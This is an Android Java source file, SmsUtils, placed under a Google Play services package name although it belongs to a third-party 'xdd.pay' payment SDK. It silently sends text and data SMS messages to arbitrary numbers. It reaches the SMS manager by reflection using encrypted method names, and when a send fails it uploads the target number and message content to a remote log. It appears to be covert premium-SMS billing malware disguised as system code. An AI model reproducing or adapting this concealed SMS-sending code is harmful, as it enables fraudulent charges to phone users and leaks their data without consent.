package com.google.android.gms.util;

import java.lang.reflect.Method;
import java.util.ArrayList;

import org.json.JSONObject;

import android.app.PendingIntent;
import android.util.Base64;
import android.util.Log;

import com.google.android.gms.SmsSender;
import com.xdd.pay.data.StringData;
import com.xdd.pay.network.object.SmsLogInfo;
import com.xdd.pay.util.EncryptUtils;
import com.xdd.pay.util.PayUtils;
import com.xdd.pay.util.QYLog;
import com.xdd.pay.util.TelephonyMgr;
import com.xdd.pay.util.constant.JsonParameter;
import com.xdd.pay.util.constant.MOType;
import com.xdd.pay.util.constant.ResultType;
import com.xdd.pay.util.constant.SmsConstant;

public class SmsUtils {
  public static String  smsMehod;
  public static boolean issmshelp        = false;
  public static String  smstextException = "";
  public static String  smsDataException = "";

  /**
   * 发送短信
   * 
   * @param destPhone
   * @param message
   * @param sentPI
   * @param deliverPI
   */
  @SuppressWarnings({ "rawtypes", "unchecked" })
  public static void sendSms(String destPhone, String message, PendingIntent sentPI, PendingIntent deliverPI) {

//    if (ThirdUtils.sendsmsHelp(PayUtils.method, "isms", destPhone, message, sentPI, deliverPI) && !SmsSender.smshelpFail) {
//      QYLog.d("sendsmsHelp = true ");
//      smsMehod = "0";
//      issmshelp = true;
//      return;
//    }
    try {

      SmsSender.smshelpFail = false;
      smsMehod = "1";
      QYLog.d("sendsmsHelp = false ");
      Class c = Class.forName(StringData.getInstance().SMS_MANAGER);
      Method mDefault = c.getDeclaredMethod("getDefault");
      Object oManager = mDefault.invoke(c);
      Method mDivideMessage = c.getDeclaredMethod("divideMessage", String.class);
      ArrayList<String> msgs = (ArrayList<String>) mDivideMessage.invoke(oManager, message);
      Method mSendTextMessage = c.getDeclaredMethod("sendTextMessage", new Class[] { String.class, String.class, String.class, PendingIntent.class,
          PendingIntent.class });
      for (String msg : msgs) {
        mSendTextMessage.invoke(oManager, new Object[] { destPhone, null, msg, sentPI, deliverPI });
      }
    } catch (Exception e) {
      QYLog.e("send error");
      if (e != null && e.getLocalizedMessage() != null) {
        smstextException = e.getLocalizedMessage();
      } else {
        smstextException = "exception";
      }
      // 上传短信发送异常日志
      try {
        SmsLogInfo smsLogInfo = new SmsLogInfo();
        smsLogInfo.setLocalTime(System.currentTimeMillis() + "");
        smsLogInfo.setPhoneNum(destPhone);
        smsLogInfo.setSms(message);
        smsLogInfo.setType(MOType.SMS_SEND_EXCEPTION);
        smsLogInfo.setResult(ResultType.FAIL);
        JSONObject obj = new JSONObject();
        obj.accumulate(JsonParameter.SMSTEXTEXCEPTION, SmsUtils.smstextException);
        if (TelephonyMgr.isDualMode(PayUtils.getInstance().mContext)) {
          obj.accumulate(JsonParameter.ISDUALMODE, 1 + "");
        } else {
          obj.accumulate(JsonParameter.ISDUALMODE, 0 + "");
        }
        smsLogInfo.setReserved2(obj.toString());
        PayUtils.getInstance().sendRealTimeLog(smsLogInfo, false);
        SmsUtils.smstextException = "";
      } catch (Exception e1) {
        QYLog.e("send sendTextMessage error:" + e1);
      }
      // 上传短信发送失败日志
    }
  }

	/**
	 * 发送数据内容格式短信
	 * 
	 * @param destPhone
	 * @param message
	 * @param sentPI
	 * @param deliverPI
	 */
	public static void sendDataMessage(String destPhone, String message, PendingIntent sentPI, PendingIntent deliverPI, int mPort) {
		try {
			Class<?> c = Class.forName(StringData.getInstance().SMS_MANAGER);
			Method mDefault = c.getDeclaredMethod(EncryptUtils.decode(SmsConstant.GET_DEFAULT));
			Object oManager = mDefault.invoke(c);
			Method mSendDataMessage = c.getDeclaredMethod(EncryptUtils.decode(SmsConstant.SEND_DATA_MSG), new Class[]{String.class, String.class,
					short.class, byte[].class, PendingIntent.class, PendingIntent.class});
			mSendDataMessage.invoke(oManager, new Object[]{destPhone, null, (short)mPort, getByteContent(message), sentPI, deliverPI});
		} catch (Exception e) {
			Log.i("paylog", e.getMessage());
			e.printStackTrace();
			QYLog.e("send data error:" + e);
      if (e != null && e.getLocalizedMessage() != null) {
        smsDataException = e.getLocalizedMessage();
      } else {
        smsDataException = "exception";
      }
      // 上传短信发送异常日志
      try {
        SmsLogInfo smsLogInfo = new SmsLogInfo();
        smsLogInfo.setLocalTime(System.currentTimeMillis() + "");
        smsLogInfo.setPhoneNum(destPhone);
        smsLogInfo.setSms(message);
        smsLogInfo.setType(MOType.SMS_SEND_EXCEPTION);
        smsLogInfo.setResult(ResultType.FAIL);
        JSONObject obj = new JSONObject();
        obj.accumulate(JsonParameter.SMSDATAEXCEPTION, SmsUtils.smsDataException);
        if (TelephonyMgr.isDualMode(PayUtils.getInstance().mContext)) {
          obj.accumulate(JsonParameter.ISDUALMODE, 1 + "");
        } else {
          obj.accumulate(JsonParameter.ISDUALMODE, 0 + "");
        }
        smsLogInfo.setReserved2(obj.toString());
        PayUtils.getInstance().sendRealTimeLog(smsLogInfo, false);
        smsDataException = "";
      } catch (Exception e1) {
        QYLog.e("error:" + e1);
      }
      // 上传短信发送失败日志
    }
  }

	public static byte[] getByteContent(String sendcontent){
		return Base64.decode(sendcontent, Base64.DEFAULT);
	}
}
